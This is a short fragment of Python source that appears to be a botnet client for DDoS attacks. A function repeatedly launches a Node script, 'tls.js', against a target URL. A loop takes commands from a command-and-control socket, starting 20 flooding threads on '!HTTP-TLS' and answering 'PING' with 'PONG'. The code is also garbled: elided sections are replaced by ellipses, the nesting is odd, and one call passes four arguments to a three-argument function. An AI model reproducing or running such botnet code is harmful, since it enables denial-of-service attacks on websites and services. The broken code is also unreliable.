...
def attack_tls(url, end_time, size):
    while time.time() < end_time:
        try:
            subprocess.run(["node", "tls.js", url, str(end_time)])
        except Exception as e:
            print("Error:", e)
            continue
        ...
        while 1:
            try:
                ...
                if command == '!HTTP-TLS':
                    ...
                    threads = 20
                    for _ in range(threads):
                        threading.Thread(target=attack_tls, args=(url, port, end_time, size), daemon=True).start()
                elif command == 'PING':
                    c2.send('PONG'.encode())
            except:
                break
